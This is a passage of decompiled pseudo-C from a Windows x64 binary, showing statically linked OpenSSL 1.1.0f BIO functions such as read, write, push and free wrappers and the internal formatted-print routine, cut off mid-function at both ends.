      a2 = v10;
      a1[4] = 1;
    }
    if ( a2 )
    {
      v9 = sub_14002BCE0(
             (__int64)&v10,
             *((_QWORD *)a1 + 1),
             *a1,
             8,
             *((__int64 (__fastcall **)(__int64, __int64))a1 + 4),
             a3);
      if ( v9 )
        return (v9 - *((_QWORD *)a1 + 1)) >> 3;
    }
    return 0xFFFFFFFFi64;
  }
  v6 = *a1;
  result = 0i64;
  if ( *a1 <= 0 )
    return 0xFFFFFFFFi64;
  for ( i = (_QWORD *)*((_QWORD *)a1 + 1); *i != a2; ++i )
  {
    result = (unsigned int)(result + 1);
    if ( (int)result >= v6 )
      return 0xFFFFFFFFi64;
  }
  return result;
}

//----- (0000000140029970) ----------------------------------------------------
__int64 __fastcall sub_140029970(_QWORD *a1, unsigned int a2, __int64 a3)
{
  __int64 result; // rax
  __int64 (__fastcall *v6)(_QWORD *, __int64, __int64 *, _QWORD, _DWORD, int); // rdi
  __int64 v7; // [rsp+50h] [rbp+18h] BYREF

  v7 = a3;
  if ( !a1 )
    return 0i64;
  if ( *a1 && *(_QWORD *)(*a1 + 72i64) )
  {
    v6 = (__int64 (__fastcall *)(_QWORD *, __int64, __int64 *, _QWORD, _DWORD, int))a1[1];
    if ( !v6 || (result = v6(a1, 6i64, &v7, a2, 0, 1), (int)result > 0) )
    {
      result = (*(__int64 (__fastcall **)(_QWORD *, _QWORD))(*a1 + 72i64))(a1, a2);
      if ( v6 )
        return v6(a1, 134i64, &v7, a2, 0, result);
    }
  }
  else
  {
    sub_140024610(32, 131, 121, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bio\\bio_lib.c", 364);
    return 4294967294i64;
  }
  return result;
}

//----- (0000000140029A60) ----------------------------------------------------
void __fastcall sub_140029A60(__int64 a1, int a2)
{
  *(_DWORD *)(a1 + 32) &= ~a2;
}

//----- (0000000140029A70) ----------------------------------------------------
__int64 __fastcall sub_140029A70(__int64 a1)
{
  __int64 v1; // rdx
  __int64 result; // rax

  v1 = *(_QWORD *)(a1 + 56);
  *(_DWORD *)(a1 + 32) |= *(_DWORD *)(v1 + 32) & 0xF;
  result = *(unsigned int *)(v1 + 36);
  *(_DWORD *)(a1 + 36) = result;
  return result;
}

//----- (0000000140029A90) ----------------------------------------------------
__int64 __fastcall sub_140029A90(_QWORD *a1, unsigned int a2, unsigned int a3, __int64 a4)
{
  __int64 result; // rax
  __int64 (__fastcall *v9)(_QWORD *, __int64, __int64, _QWORD, unsigned int, int); // rdi

  if ( !a1 )
    return 0i64;
  if ( *a1 && *(_QWORD *)(*a1 + 48i64) )
  {
    v9 = (__int64 (__fastcall *)(_QWORD *, __int64, __int64, _QWORD, unsigned int, int))a1[1];
    if ( !v9 || (result = v9(a1, 6i64, a4, a2, a3, 1), (int)result > 0) )
    {
      result = (*(__int64 (__fastcall **)(_QWORD *, _QWORD, _QWORD, __int64))(*a1 + 48i64))(a1, a2, a3, a4);
      if ( v9 )
        return v9(a1, 134i64, a4, a2, a3, result);
    }
  }
  else
  {
    sub_140024610(32, 103, 121, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\bio\\bio_lib.c", 336);
    return 4294967294i64;
  }
  return result;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140029B70) ----------------------------------------------------
int **__fastcall sub_140029B70(int *a1, int a2)
{
  int v3; // edx

  while ( a1 )
  {
    if ( *(_QWORD *)a1 )
    {
      v3 = **(_DWORD **)a1;
      if ( (_BYTE)a2 )
      {
        if ( v3 == a2 )
          return (int **)a1;
      }
      else if ( (v3 & a2) != 0 )
      {
        return (int **)a1;
      }
    }
    a1 = (int *)*((_QWORD *)a1 + 7);
  }
  return 0i64;
}

//----- (0000000140029BA0) ----------------------------------------------------
__int64 __fastcall sub_140029BA0(__int64 a1)
{
  __int64 result; // rax
  __int64 (__fastcall *v3)(__int64, __int64, _QWORD); // rax
  void (__fastcall *v4)(__int64); // rdx
  int v5; // [rsp+40h] [rbp+8h] BYREF

  if ( !a1 || (int)sub_140025D60((_DWORD *)(a1 + 72), -1, &v5) <= 0 )
    return 0i64;
  if ( v5 > 0 )
    return 1i64;
  v3 = *(__int64 (__fastcall **)(__int64, __int64, _QWORD))(a1 + 8);
  if ( !v3 || (result = v3(a1, 1i64, 0i64), v5 = result, (int)result > 0) )
  {
    if ( *(_QWORD *)a1 )
    {
      v4 = *(void (__fastcall **)(__int64))(*(_QWORD *)a1 + 64i64);
      if ( v4 )
        v4(a1);
    }
    sub_140025FB0(0xCu, a1, (__int64 *)(a1 + 96));
    sub_140025BE0(*(_DWORD **)(a1 + 104));
    sub_14001D930((void *)a1);
    return 1i64;
  }
  return result;
}

//----- (0000000140029C60) ----------------------------------------------------
void __fastcall sub_140029C60(__int64 a1)
{
  __int64 v1; // rdi
  int v2; // esi
  _DWORD *v3; // rcx
  __int64 *v4; // rbx
  __int64 (__fastcall *v5)(__int64 *, __int64, _QWORD); // rax
  void (__fastcall *v6)(__int64 *); // rdx
  int v7; // [rsp+40h] [rbp+8h] BYREF

  if ( a1 )
  {
    v1 = a1;
    do
    {
      v2 = *(_DWORD *)(v1 + 72);
      v3 = (_DWORD *)(v1 + 72);
      v4 = (__int64 *)v1;
      v1 = *(_QWORD *)(v1 + 56);
      if ( (int)sub_140025D60(v3, -1, &v7) > 0 && v7 <= 0 )
      {
        v5 = (__int64 (__fastcall *)(__int64 *, __int64, _QWORD))v4[1];
        if ( !v5 || (v7 = v5(v4, 1i64, 0i64), v7 > 0) )
        {
          if ( *v4 )
          {
            v6 = *(void (__fastcall **)(__int64 *))(*v4 + 64);
            if ( v6 )
              v6(v4);
          }
          sub_140025FB0(0xCu, (__int64)v4, v4 + 12);
          sub_140025BE0((_DWORD *)v4[13]);
          sub_14001D930(v4);
        }
      }
    }
    while ( v2 <= 1 && v1 );
  }
}

//----- (0000000140029D50) ----------------------------------------------------
__int64 __fastcall sub_140029D50(__int64 a1)
{
  return *(unsigned int *)(a1 + 24);
}

//----- (0000000140029D60) ----------------------------------------------------
__int64 __fastcall sub_140029D60(__int64 a1, __int64 a2, unsigned int a3)
{
  __int64 (__fastcall *v6)(__int64, __int64, __int64, _QWORD, _DWORD, int); // rdi
  __int64 result; // rax

  if ( a1 && *(_QWORD *)a1 && *(_QWORD *)(*(_QWORD *)a1 + 40i64) )
  {
    v6 = *(__int64 (__fastcall **)(__int64, __int64, __int64, _QWORD, _DWORD, int))(a1 + 8);
    if ( !v6 || (result = v6(a1, 5i64, a2, a3, 0, 1), (int)result > 0) )
    {
      if ( *(_DWORD *)(a1 + 24) )
      {
        result = (*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)a1 + 40i64))(a1, a2, a3);
        if ( v6 )
          return v6(a1, 133i64, a2, a3, 0, result);
      }
      else
      {
        sub_140024610(32, 104, 120, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\bio\\bio_lib.c", 286);
        return 4294967294i64;
      }
    }
  }
  else
  {
    sub_140024610(32, 104, 121, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\bio\\bio_lib.c", 276);
    return 4294967294i64;
  }
  return result;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140029E80) ----------------------------------------------------
__int64 __fastcall sub_140029E80(__int64 a1, int a2, int a3)
{
  int v4; // esi
  __int64 (__fastcall *v5)(__int64, __int64, const char *); // rdi
  int v6; // ecx
  int v7; // eax

  v4 = 0;
  if ( a2 >= 0 )
    v4 = a2;
  if ( v4 > a3 )
    v4 = a3;
  if ( !v4 )
    return 1i64;
  while ( 1 )
  {
    --v4;
    if ( !a1 || !*(_QWORD *)a1 || !*(_QWORD *)(*(_QWORD *)a1 + 32i64) )
      break;
    v5 = *(__int64 (__fastcall **)(__int64, __int64, const char *))(a1 + 8);
    if ( !v5 || (v6 = v5(a1, 4i64, " "), v6 > 0) )
    {
      if ( !*(_DWORD *)(a1 + 24) )
      {
        sub_140024610(32, 110, 120, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\bio\\bio_lib.c", 256);
        return 0i64;
      }
      v7 = (*(__int64 (__fastcall **)(__int64, const char *))(*(_QWORD *)a1 + 32i64))(a1, " ");
      v6 = v7;
      if ( v7 > 0 )
        *(_QWORD *)(a1 + 88) += v7;
      if ( v5 )
        v6 = ((__int64 (__fastcall *)(__int64, __int64, const char *, _QWORD, _DWORD, int))v5)(
               a1,
               132i64,
               " ",
               0i64,
               0,
               v7);
    }
    if ( v6 != 1 )
      return 0i64;
    if ( !v4 )
      return 1i64;
  }
  sub_140024610(32, 110, 121, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\bio\\bio_lib.c", 246);
  return 0i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140029FB0) ----------------------------------------------------
__int64 __fastcall sub_140029FB0(_QWORD *a1, unsigned int a2, unsigned int a3, int a4)
{
  int v5; // [rsp+48h] [rbp+20h] BYREF

  v5 = a4;
  return sub_140029A90(a1, a2, a3, (__int64)&v5);
}

//----- (0000000140029FE0) ----------------------------------------------------
__int64 *__fastcall sub_140029FE0(__int64 a1)
{
  int v1; // eax
  __int64 *v3; // rax
  __int64 *v4; // rbx
  _DWORD *v6; // rax
  unsigned int (__fastcall *v7)(__int64 *); // rax

  v3 = (__int64 *)sub_14001DC20((unsigned int)(v1 + 64));
  v4 = v3;
  if ( !v3 )
  {
    sub_140024610(32, 108, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\bio\\bio_lib.c", 21);
    return 0i64;
  }
  *v3 = a1;
  *((_DWORD *)v3 + 7) = 1;
  *((_DWORD *)v3 + 18) = 1;
  if ( !(unsigned int)sub_140026350(0xCu, (__int64)v3, v3 + 12) )
    goto LABEL_6;
  v6 = sub_140025C10();
  v4[13] = (__int64)v6;
  if ( !v6 )
  {
    sub_140024610(32, 108, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\bio\\bio_lib.c", 34);
    sub_140025FB0(0xCu, (__int64)v4, v4 + 12);
LABEL_6:
    sub_14001D930(v4);
    return 0i64;
  }
  v7 = *(unsigned int (__fastcall **)(__int64 *))(a1 + 56);
  if ( v7 && !v7(v4) )
  {
    sub_140024610(32, 108, 70, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\bio\\bio_lib.c", 40);
    sub_140025FB0(0xCu, (__int64)v4, v4 + 12);
    sub_140025BE0((_DWORD *)v4[13]);
    goto LABEL_6;
  }
  return v4;
}
// 140029FFA: variable 'v1' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014002A130) ----------------------------------------------------
__int64 __fastcall sub_14002A130(__int64 a1)
{
  if ( a1 )
    return *(_QWORD *)(a1 + 56);
  else
    return 0i64;
}

//----- (000000014002A140) ----------------------------------------------------
_QWORD *__fastcall sub_14002A140(_QWORD *a1, __int64 a2)
{
  __int64 v4; // rax
  __int64 v5; // r9
  bool v6; // zf

  if ( !a1 )
    return (_QWORD *)a2;
  v4 = (__int64)(a1 + 7);
  v5 = (__int64)a1;
  if ( a1[7] )
  {
    do
    {
      v5 = *(_QWORD *)v4;
      v6 = *(_QWORD *)(*(_QWORD *)v4 + 56i64) == 0i64;
      v4 = *(_QWORD *)v4 + 56i64;
    }
    while ( !v6 );
  }
  *(_QWORD *)(v5 + 56) = a2;
  if ( a2 )
    *(_QWORD *)(a2 + 64) = v5;
  sub_140029A90(a1, 6u, 0, v5);
  return a1;
}

//----- (000000014002A1A0) ----------------------------------------------------
__int64 __fastcall sub_14002A1A0(__int64 a1, __int64 a2)
{
  __int64 (__fastcall *v4)(_QWORD, _QWORD, _QWORD); // rdi
  __int64 result; // rax

  if ( a1 && *(_QWORD *)a1 && *(_QWORD *)(*(_QWORD *)a1 + 32i64) )
  {
    v4 = *(__int64 (__fastcall **)(_QWORD, _QWORD, _QWORD))(a1 + 8);
    if ( !v4 || (result = v4(a1, 4i64, a2), (int)result > 0) )
    {
      if ( *(_DWORD *)(a1 + 24) )
      {
        result = (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + 32i64))(a1, a2);
        if ( (int)result > 0 )
          *(_QWORD *)(a1 + 88) += (int)result;
        if ( v4 )
          return ((__int64 (__fastcall *)(__int64, __int64, __int64, _QWORD, _DWORD, _DWORD))v4)(
                   a1,
                   132i64,
                   a2,
                   0i64,
                   0,
                   result);
      }
      else
      {
        sub_140024610(32, 110, 120, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\bio\\bio_lib.c", 256);
        return 4294967294i64;
      }
    }
  }
  else
  {
    sub_140024610(32, 110, 121, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\bio\\bio_lib.c", 246);
    return 4294967294i64;
  }
  return result;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014002A2C0) ----------------------------------------------------
__int64 __fastcall sub_14002A2C0(__int64 a1, __int64 a2, unsigned int a3)
{
  __int64 (__fastcall *v6)(__int64, __int64, __int64, _QWORD, _DWORD, int); // rdi
  __int64 result; // rax

  if ( a1 && *(_QWORD *)a1 && *(_QWORD *)(*(_QWORD *)a1 + 24i64) )
  {
    v6 = *(__int64 (__fastcall **)(__int64, __int64, __int64, _QWORD, _DWORD, int))(a1 + 8);
    if ( !v6 || (result = v6(a1, 2i64, a2, a3, 0, 1), (int)result > 0) )
    {
      if ( *(_DWORD *)(a1 + 24) )
      {
        result = (*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)a1 + 24i64))(a1, a2, a3);
        if ( (int)result > 0 )
          *(_QWORD *)(a1 + 80) += (int)result;
        if ( v6 )
          return v6(a1, 130i64, a2, a3, 0, result);
      }
      else
      {
        sub_140024610(32, 111, 120, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bio\\bio_lib.c", 193);
        return 4294967294i64;
      }
    }
  }
  else
  {
    sub_140024610(32, 111, 121, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bio\\bio_lib.c", 183);
    return 4294967294i64;
  }
  return result;
}

//----- (000000014002A3F0) ----------------------------------------------------
void __fastcall sub_14002A3F0(__int64 a1, __int64 a2)
{
  *(_QWORD *)(a1 + 48) = a2;
}

//----- (000000014002A400) ----------------------------------------------------
void __fastcall sub_14002A400(__int64 a1, int a2)
{
  *(_DWORD *)(a1 + 32) |= a2;
}

//----- (000000014002A410) ----------------------------------------------------
void __fastcall sub_14002A410(__int64 a1, int a2)
{
  *(_DWORD *)(a1 + 24) = a2;
}

//----- (000000014002A420) ----------------------------------------------------
__int64 __fastcall sub_14002A420(__int64 a1, unsigned int a2)
{
  return a2 & *(_DWORD *)(a1 + 32);
}

//----- (000000014002A430) ----------------------------------------------------
__int64 __fastcall sub_14002A430(__int64 a1, __int64 a2, unsigned int a3)
{
  __int64 result; // rax
  __int64 (__fastcall *v7)(__int64, __int64, __int64, _QWORD, _DWORD, int); // rdi

  if ( !a1 )
    return 0i64;
  v7 = *(__int64 (__fastcall **)(__int64, __int64, __int64, _QWORD, _DWORD, int))(a1 + 8);
  if ( !*(_QWORD *)a1 || !*(_QWORD *)(*(_QWORD *)a1 + 16i64) )
  {
    sub_140024610(32, 113, 121, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\bio\\bio_lib.c", 217);
    return 4294967294i64;
  }
  if ( !v7 || (result = v7(a1, 3i64, a2, a3, 0, 1), (int)result > 0) )
  {
    if ( !*(_DWORD *)(a1 + 24) )
    {
      sub_140024610(32, 113, 120, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\bio\\bio_lib.c", 226);
      return 4294967294i64;
    }
    result = (*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)a1 + 16i64))(a1, a2, a3);
    if ( (int)result > 0 )
      *(_QWORD *)(a1 + 88) += (int)result;
    if ( v7 )
      return v7(a1, 131i64, a2, a3, 0, result);
  }
  return result;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014002A540) ----------------------------------------------------
void sub_14002A540()
{
  sub_140046E10();
  sub_140025BE0((_DWORD *)qword_140147E78);
  qword_140147E78 = 0i64;
  sub_140025BE0((_DWORD *)qword_140143358);
  qword_140143358 = 0i64;
}
// 140143358: using guessed type __int64 qword_140143358;
// 140147E78: using guessed type __int64 qword_140147E78;

//----- (000000014002A590) ----------------------------------------------------
__int64 sub_14002A590(__int64 a1, char *a2, ...)
{
  va_list va; // [rsp+40h] [rbp+18h] BYREF

  va_start(va, a2);
  return sub_14002A640(a1, a2, (int *)va);
}

//----- (000000014002A5C0) ----------------------------------------------------
__int64 sub_14002A5C0(const void *a1, unsigned __int64 a2, char *a3, ...)
{
  __int64 result; // rax
  int v4; // [rsp+40h] [rbp-28h] BYREF
  unsigned __int64 v5; // [rsp+48h] [rbp-20h] BYREF
  const void *v6; // [rsp+50h] [rbp-18h] BYREF
  unsigned __int64 v7; // [rsp+58h] [rbp-10h] BYREF
  va_list va; // [rsp+88h] [rbp+20h] BYREF

  va_start(va, a3);
  v5 = a2;
  v6 = a1;
  if ( !(unsigned int)sub_14002A730(&v6, 0i64, &v5, &v7, &v4, a3, (int *)va) )
    return 0xFFFFFFFFi64;
  result = 0xFFFFFFFFi64;
  if ( !v4 && v7 <= 0x7FFFFFFF )
    return (unsigned int)v7;
  return result;
}

//----- (000000014002A640) ----------------------------------------------------
__int64 __fastcall sub_14002A640(__int64 a1, char *a2, int *a3)
{
  unsigned int v5; // edi
  void *v6; // [rsp+40h] [rbp-848h] BYREF
  __int64 v7; // [rsp+48h] [rbp-840h] BYREF
  int v8; // [rsp+50h] [rbp-838h] BYREF
  unsigned __int64 v9; // [rsp+58h] [rbp-830h] BYREF
  char *v10; // [rsp+60h] [rbp-828h] BYREF
  char v11[2048]; // [rsp+70h] [rbp-818h] BYREF

  v10 = v11;
  v9 = 2048i64;
  v6 = 0i64;
  if ( (unsigned int)sub_14002A730((const void **)&v10, &v6, &v9, &v7, &v8, a2, a3) )
  {
    if ( v6 )
    {
      v5 = sub_14002A430(a1, (__int64)v6, v7);
      sub_14001D930(v6);
    }
    else
    {
      return (unsigned int)sub_14002A430(a1, (__int64)v11, v7);
    }
    return v5;
  }
  else
  {
    sub_14001D930(v6);
    return 0xFFFFFFFFi64;
  }
}

//----- (000000014002A730) ----------------------------------------------------
__int64 __fastcall sub_14002A730(
        const void **a1,
        void **a2,
        unsigned __int64 *a3,
        _QWORD *a4,
        _DWORD *a5,
        char *a6,
        int *a7)
{
  int v8; // ebp
  int v10; // r9d
  int v11; // r14d
  int v12; // r15d
  int v14; // r8d
  const void **v16; // r10
  char v17; // di
  unsigned __int64 v18; // rax
  bool v19; // cf
  bool v20; // zf
  __int64 result; // rax
  int v22; // eax
  int v23; // eax
  int v24; // r8d
  int v25; // eax
  int v26; // r14d
  int v27; // r14d
  __int64 v28; // rax
  int v29; // eax
  char v30; // r15
  int v31; // r14d
  int v32; // r14d
  __int64 v33; // rcx
  unsigned int v34; // eax
  double v35; // xmm0_8
  double v36; // xmm0_8
  double v37; // xmm0_8
  int v38; // eax
  char *v39; // rax
  __int64 v40; // rax
  _WORD *v41; // rcx
  int v42; // [rsp+50h] [rbp-48h]
  int v43; // [rsp+54h] [rbp-44h]
  size_t v44[8]; // [rsp+58h] [rbp-40h] BYREF

  v8 = 0;
  v10 = 0;
  v11 = 0;
  v44[0] = 0i64;
  v12 = 0;
  v14 = -1;
  v43 = -1;
  v16 = a1;
LABEL_2:
  v42 = v10;
LABEL_3:
  v17 = *a6++;
LABEL_4:
  while ( v17 && (a2 || v44[0] < *a3) )
  {
    switch ( v8 )
    {
      case 0:
        if ( v17 == 37 )
        {
          v8 = 1;
        }
        else
        {
          if ( !(unsigned int)sub_14002AE50(v16, a2, v44, a3, v17) )
            return 0i64;
          v14 = v43;
          v10 = v42;
          v16 = a1;
        }
        v17 = *a6++;
        goto LABEL_4;
      case 1:
        switch ( v17 )
        {
          case ' ':
            v12 |= 4u;
            break;
          case '#':
            v12 |= 8u;
            break;
          case '+':
            v12 |= 2u;
            break;
          case '-':
            v12 |= 1u;
            break;
          case '0':
            v12 |= 0x10u;
            break;
          default:
            v8 = 2;
            goto LABEL_4;
        }
        goto LABEL_3;
      case 2:
        if ( isdigit((unsigned __int8)v17) )
        {
          v14 = v43;
          v16 = a1;
          v22 = v17;
          v17 = *a6++;
          v10 = v22 + 2 * (5 * v42 - 24);
          v42 = v10;
          goto LABEL_4;
        }
        v8 = 3;
        if ( v17 != 42 )
          goto LABEL_33;
        v10 = *a7;
        a7 += 2;
        v14 = v43;
        v16 = a1;
        goto LABEL_2;
      case 3:
        if ( v17 == 46 )
        {
          v8 = 4;
          goto LABEL_3;
        }
        v8 = 5;
        goto LABEL_4;
      case 4:
        if ( isdigit((unsigned __int8)v17) )
        {
          v10 = v42;
          v23 = 0;
          v16 = a1;
          if ( v43 >= 0 )
            v23 = v43;
          v24 = 5 * v23;
          v25 = v17;
          v17 = *a6++;
          v14 = v25 + 2 * (v24 - 24);
          v43 = v14;
          goto LABEL_4;
        }
        v8 = 5;
        if ( v17 != 42 )
        {
LABEL_33:
          v14 = v43;
          v10 = v42;
          v16 = a1;
          goto LABEL_4;
        }
        v14 = *a7;
        a7 += 2;
        v10 = v42;
        v16 = a1;
        v43 = v14;
        goto LABEL_3;
      case 5:
        if ( v17 == 76 )
        {
          v17 = *a6;
          v11 = 3;
          ++a6;
LABEL_54:
          v8 = 6;
          goto LABEL_4;
        }
        if ( v17 == 104 )
        {
          v17 = *a6;
          v11 = 1;
          ++a6;
          v8 = 6;
          goto LABEL_4;
        }
        if ( v17 != 108 )
        {
          if ( v17 == 113 )
          {
            v17 = *a6;
            v11 = 4;
            ++a6;
            v8 = 6;
            goto LABEL_4;
          }
          goto LABEL_54;
        }
        if ( *a6 == 108 )
        {
          v17 = *++a6;
          v11 = 4;
        }
        else
        {
          v17 = *a6;
          v11 = 2;
        }
        ++a6;
        v8 = 6;
        break;
      case 6:
        switch ( v17 )
        {
          case '%':
            v29 = sub_14002AE50(v16, a2, v44, a3, v17);
            goto LABEL_64;
          case 'E':
            LOBYTE(v12) = v12 | 0x20;
            goto LABEL_82;
          case 'G':
            LOBYTE(v12) = v12 | 0x20;
            goto LABEL_84;
          case 'X':
            LOBYTE(v12) = v12 | 0x20;
            goto LABEL_67;
          case 'c':
            v38 = *a7;
            a7 += 2;
            v29 = sub_14002AE50(v16, a2, v44, a3, v38);
            goto LABEL_64;
          case 'd':
          case 'i':
            v26 = v11 - 1;
            if ( v26 )
            {
              v27 = v26 - 1;
              if ( v27 )
              {
                a7 += 2;
                if ( v27 == 2 )
                  v28 = *((_QWORD *)a7 - 1);
                else
                  v28 = *(a7 - 2);
              }
              else
              {
                v28 = *a7;
                a7 += 2;
              }
            }
            else
            {
              v28 = *(__int16 *)a7;
              a7 += 2;
            }
            v29 = sub_14002B660(v16, a2, v44, a3, v28, 0xAu, v10, v14, v12);
            goto LABEL_64;
          case 'e':
LABEL_82:
            v36 = *(double *)a7;
            a7 += 2;
            v29 = sub_14002AFB0(v16, a2, v44, a3, v36, v10, v14, v12, 1);
            goto LABEL_64;
          case 'f':
            v35 = *(double *)a7;
            a7 += 2;
            v29 = sub_14002AFB0(v16, a2, v44, a3, v35, v10, v14, v12, 0);
            goto LABEL_64;
          case 'g':
LABEL_84:
            v37 = *(double *)a7;
            a7 += 2;
            v29 = sub_14002AFB0(v16, a2, v44, a3, v37, v10, v14, v12, 2);
            goto LABEL_64;
          case 'n':
            v41 = *(_WORD **)a7;
            a7 += 2;
            if ( v11 == 1 )
            {
              *v41 = v44[0];
            }
            else if ( v11 == 4 )
            {
              *(_QWORD *)v41 = v44[0];
            }
            else
            {
              *(_DWORD *)v41 = v44[0];
            }
            goto LABEL_99;
          case 'o':
          case 'u':
          case 'x':
LABEL_67:
            v30 = v12 | 0x40;
            v31 = v11 - 1;
            if ( v31 )
            {
              v32 = v31 - 1;
              if ( v32 )
              {
                a7 += 2;
                if ( v32 == 2 )
                  v33 = *((_QWORD *)a7 - 1);
                else
                  v33 = (unsigned int)*(a7 - 2);
              }
              else
              {
                v33 = (unsigned int)*a7;
                a7 += 2;
              }
            }
            else
            {
              v33 = *(unsigned __int16 *)a7;
              a7 += 2;
            }
            if ( v17 == 111 )
            {
              v34 = 8;
            }
            else
            {
              v34 = 16;
              if ( v17 == 117 )
                v34 = 10;
            }
            if ( !(unsigned int)sub_14002B660(v16, a2, v44, a3, v33, v34, v10, v14, v30) )
              return 0i64;
            v16 = a1;
            goto LABEL_99;
          case 'p':
            v40 = *(_QWORD *)a7;
            a7 += 2;
            v29 = sub_14002B660(v16, a2, v44, a3, v40, 0x10u, v10, v14, v12 | 8u);
            goto LABEL_64;
          case 's':
            v39 = *(char **)a7;
            a7 += 2;
            if ( v14 < 0 )
            {
              v14 = 0x7FFFFFFF;
              if ( !a2 )
                v14 = *(_DWORD *)a3;
            }
            v29 = sub_14002B940(v16, a2, v44, a3, v39, v12, v10, v14);
LABEL_64:
            if ( !v29 )
              return 0i64;
            v16 = a1;
LABEL_99:
            v17 = *a6;
            v10 = 0;
            ++a6;
            v42 = 0;
            v8 = 0;
            v11 = 0;
            v12 = 0;
            v14 = -1;
            v43 = -1;
            break;
          case 'w':
            ++a6;
            goto LABEL_99;
          default:
            goto LABEL_99;
        }
        goto LABEL_4;
      default:
        goto LABEL_4;
    }
  }
  if ( !a2 )
  {
    v18 = *a3 - 1;
    v19 = v44[0] < v18;
    v20 = v44[0] == v18;
    *a5 = v44[0] > v18;
    if ( !v19 && !v20 )
      v44[0] = *a3 - 1;
  }
  if ( !(unsigned int)sub_14002AE50(v16, a2, v44, a3, 0) )
    return 0i64;
  result = 1i64;
  *a4 = v44[0] - 1;
  return result;
}
// 14002A81C: conditional instruction was optimized away because ebp.4<7u

//----- (000000014002AE50) ----------------------------------------------------
__int64 __fastcall sub_14002AE50(const void **a1, void **a2, size_t *a3, unsigned __int64 *a4, char a5)
{
  unsigned __int64 v9; // rax
  size_t v11; // rax
  void *v12; // rax
  void *v13; // rax
  _BYTE *v14; // rcx

  if ( !*a1 && !a2 )
    sub_1400234A0(
      "assertion failed: *sbuffer != NULL || buffer != NULL",
      "..\\..\\openssl-1.1.0f\\crypto\\bio\\b_print.c",
      807i64);
  if ( *a3 > *a4 )
    sub_1400234A0("assertion failed: *currlen <= *maxlen", "..\\..\\openssl-1.1.0f\\crypto\\bio\\b_print.c", 810i64);
  if ( a2 )
  {
    v9 = *a4;
    if ( *a3 == *a4 )
    {
      if ( v9 > 0x7FFFFBFF )
        return 0i64;
      v11 = v9 + 1024;
      *a4 = v11;
      if ( *a2 )
      {
        v13 = sub_14001D970(*a2, v11, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bio\\b_print.c", 0x33Cu);
        if ( !v13 )
          return 0i64;
        *a2 = v13;
      }
      else
      {
        v12 = sub_14001D8E0(v11);
        *a2 = v12;
        if ( !v12 )
          return 0i64;
        if ( *a3 )
        {
          if ( !*a1 )
            sub_1400234A0(
              "assertion failed: *sbuffer != NULL",
              "..\\..\\openssl-1.1.0f\\crypto\\bio\\b_print.c",
              822i64);
          memmove(*a2, *a1, *a3);
        }
        *a1 = 0i64;
      }
    }
  }
  if ( *a3 < *a4 )
  {
    v14 = *a1;
    if ( !*a1 )
      v14 = *a2;
    v14[(*a3)++] = a5;
  }
  return 1i64;
}

//----- (000000014002AFB0) ----------------------------------------------------
__int64 __fastcall sub_14002AFB0(
        const void **a1,
        void **a2,
        size_t *a3,
        unsigned __int64 *a4,
        double a5,
        int a6,
        int a7,
        char a8,
        int a9)
{
  double v9; // xmm3_8
  int v10; // ebx
  int v11; // ebp
  int v12; // r11d
  int v14; // ecx
  int v18; // eax
  double v19; // xmm4_8
  int v20; // eax
  bool v21; // cc
  int v22; // eax
  double v23; // xmm0_8
  int v24; // esi
  double v25; // xmm0_8
  double v27; // xmm2_8
  unsigned int v28; // r9d
  int i; // eax
  unsigned int v30; // ecx
  int j; // eax
  double v32; // xmm3_8
  __int64 v33; // r8
  __int64 v34; // rcx
  int v35; // r10d
  __int64 v36; // rdx
  char v37; // al
  __int64 v38; // r9
  char v39; // al
  __int64 v40; // r9
  __int64 v41; // rdi
  int v42; // ecx
  __int64 v43; // r8
  int v44; // ebx
  char v45; // al
  int v46; // edx
  int v47; // ebp
  int v48; // ecx
  int v49; // edx
  int v50; // ebx
  __int64 k; // rax
  char v52; // al
  __int64 v53; // rdi
  char v54; // al
  int v55; // [rsp+30h] [rbp-B8h]
  int v56; // [rsp+34h] [rbp-B4h]
  int v57; // [rsp+38h] [rbp-B0h]
  int v58; // [rsp+3Ch] [rbp-ACh]
  __int64 v59; // [rsp+48h] [rbp-A0h]
  char v60[72]; // [rsp+50h] [rbp-98h]

  v9 = a5;
  v10 = 0;
  v57 = 0;
  v11 = 0;
  v12 = 0;
  v58 = 0;
  v14 = 6;
  if ( a7 >= 0 )
    v14 = a7;
  if ( a5 >= 0.0 )
  {
    if ( (a8 & 2) != 0 )
    {
      v56 = 43;
    }
    else
    {
      v18 = 0;
      if ( (a8 & 4) != 0 )
        v18 = 32;
      v56 = v18;
    }
  }
  else
  {
    v56 = 45;
  }
  v19 = 1.0;
  if ( a9 == 2 )
  {
    if ( a5 == 0.0 )
    {
LABEL_12:
      v20 = 0;
      v55 = 0;
